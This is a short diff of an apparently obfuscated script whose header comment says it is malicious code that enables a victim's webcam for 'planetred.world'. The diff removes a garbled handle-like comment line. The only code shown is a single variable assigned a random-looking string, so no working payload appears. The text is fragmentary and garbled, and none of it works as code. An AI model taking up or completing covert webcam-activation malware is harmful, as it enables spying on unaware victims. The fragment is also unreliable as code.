@@ -1,5 +1,4 @@
 ## WARNING!! This script contains malicious code which will enable a victims webcam for planetred.world
-## <ýb3R$oN!c
 ## Obfuscated
 
 fyTrKPhjx=eBbTRthrtyrGRSVRscdcdorgykkOlak7ikMUmy65nhtrhbrevcweWxSwwsxwd
